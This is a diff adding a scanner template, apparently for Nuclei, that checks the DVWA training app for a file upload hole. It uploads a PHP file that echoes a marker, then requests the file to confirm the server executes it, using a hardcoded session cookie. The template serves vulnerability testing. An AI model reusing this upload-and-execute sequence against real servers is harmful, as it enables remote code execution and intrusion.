@@ -1,0 +1,48 @@
+id: dvwa-file-upload
+
+info:
+  name: DVWA File Upload Vulnerability Check
+  author: van
+  severity: high
+  description: |
+    Kiểm tra khả năng upload file `.php` lên DVWA và thực thi từ xa nếu server cho phép.
+  tags: dvwa,fileupload,rce,intrusive
+
+variables:
+  filename: "test_{{randstr}}"
+  payload: "<?php echo '{{marker}}'; ?>" 
+  marker: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |
+        POST /DVWA/vulnerabilities/upload/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=12g9sj6gdknke4870ld4boosib; security=medium
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDVWA123456
+
+        ------WebKitFormBoundaryDVWA123456
+        Content-Disposition: form-data; name="uploaded"; filename="{{filename}}.php"
+        Content-Type: application/x-php
+
+        {{payload}}
+        ------WebKitFormBoundaryDVWA123456
+        Content-Disposition: form-data; name="Upload"
+
+        Upload
+        ------WebKitFormBoundaryDVWA123456--
+
+      - |
+        GET /DVWA/hackable/uploads/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=12g9sj6gdknke4870ld4boosib; security=low
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "{{marker}}"
+      - type: status
+        status:
+          - 200
